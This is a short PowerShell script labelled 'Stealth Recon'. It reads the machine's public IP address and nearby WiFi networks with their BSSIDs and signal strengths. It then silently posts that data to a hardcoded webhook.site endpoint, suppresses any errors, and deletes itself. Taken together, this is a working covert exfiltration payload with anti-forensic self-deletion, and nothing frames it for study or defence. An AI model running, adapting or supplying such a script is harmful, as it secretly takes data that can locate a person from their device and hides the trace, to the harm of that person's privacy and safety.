# === Stealth Recon - Plain Text ===
$ip = irm https://api.ipify.org
$wifi = netsh wlan show networks mode=bssid | Select-String "SSID|BSSID|Signal|Channel" -Context 0,2

$cleanData = "Public IP: $ip`n`n=== WiFi Networks with BSSID ===`n$($wifi -join "`n")`n`nCaptured at: $(Get-Date)"

$catcherUrl = "https://webhook.site/0c2777c2-743a-4862-9a2d-0a88a11e47b2"

try {
    Invoke-RestMethod -Uri $catcherUrl -Method Post -Body $cleanData -ContentType "text/plain"
} catch { }

# Optional: Self-delete after running
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
